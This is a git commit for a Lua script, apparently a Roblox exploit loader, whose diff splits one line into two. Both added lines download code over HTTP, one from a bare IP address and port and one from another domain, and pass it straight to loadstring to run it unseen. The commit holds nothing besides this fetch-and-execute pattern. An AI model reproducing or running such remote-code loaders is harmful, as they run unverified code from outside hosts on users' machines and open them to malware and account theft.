1aeb820c32de724bdd2e4e6e523e6fd211d623db
ZenXx1 <kenjiesalazar24@gmail.com>
2025-11-03 05:33:36 +0800

    Update ZenXScriptS.lua

--- ZenXScriptS.lua
+++ ZenXScriptS.lua
@@ -1,2 +1,3 @@
 ID="1d8a7984-39a5-4e23-aab9-644123ea8a69";
-loadstring(game:HttpGet("http://5.129.235.74:3910/cdn/loader.luau"))() loadstring(game:HttpGet("https://cdn.reverse.software/visual.luau"))()
+loadstring(game:HttpGet("http://5.129.235.74:3910/cdn/loader.luau"))()
+loadstring(game:HttpGet("https://cdn.reverse.software/visual.luau"))()
